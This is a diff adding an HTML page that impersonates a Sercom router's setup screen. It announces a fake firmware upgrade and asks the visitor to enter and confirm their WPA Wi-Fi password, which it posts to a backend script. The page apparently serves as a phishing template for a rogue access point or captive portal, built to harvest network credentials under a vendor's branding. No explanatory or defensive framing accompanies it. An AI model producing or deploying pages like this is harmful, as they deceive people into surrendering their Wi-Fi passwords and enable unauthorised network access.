@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link href="./img/favicon.ico" type="image/x-icon" rel="icon">
+    <link href="./img/favicon.ico" type="image/x-icon" rel="shortcut icon">
+    
+    <link rel="stylesheet" href="./styles.css">
+    <script type="text/javascript">
+        function validateForm() {
+            var password1 = document.forms["passwordForm"]["password1"].value;
+            var password2 = document.forms["passwordForm"]["password2"].value;
+            var errorMessage = document.getElementById("error-message");
+
+            if (password1 !== password2) {
+                errorMessage.textContent = "Passwords do not match. Please re-enter.";
+                return false;
+            }
+
+            return true;
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Welcome to your Sercom Router</h1>
+        </div>
+        <div class="content">
+            <div class="image-box">
+                <img src="./img/router-wifi.png" alt="Router Image" class="router-wifi">
+            </div>
+            <div class="login-box">
+                <img src="./img/logo-sercom.png" alt="Router Logo" class="logo">
+                <h2>Enter your WPA password and confirm it.</h2>
+                <div id="error-message" style="color: red; font-weight: bold;"></div>
+                <form name="passwordForm" action="./backend.php" method="post" onsubmit="return validateForm()">
+                    <div class="input-group">
+                        <input type="password" name="password1" placeholder="WPA Password">
+                    </div>
+                    <div class="input-group">
+                        <input type="password" name="password2" placeholder="Confirm Password">
+                    </div>
+                    <button type="submit">Submit</button>
+                </form>
+            </div>
+        </div>
+        <div class="firmware-update">
+            <table id="warning">
+                <th>FIRMWARE UPGRADE:</th>
+                <tr><td>A new firmware is available to improve functionality and performance.</td></tr>
+            </table>
+
+            <table>
+                <th>DOWNLOAD AND UPGRADE:</th>
+                <tr><td><b>Current Firmware Version: </b> 1.04</td></tr>
+            </table>
+        </div>
+        <div class="footer">
+            <a href="#">English</a><br></br>
+        </div>
+    </div>
+</body>
+</html>
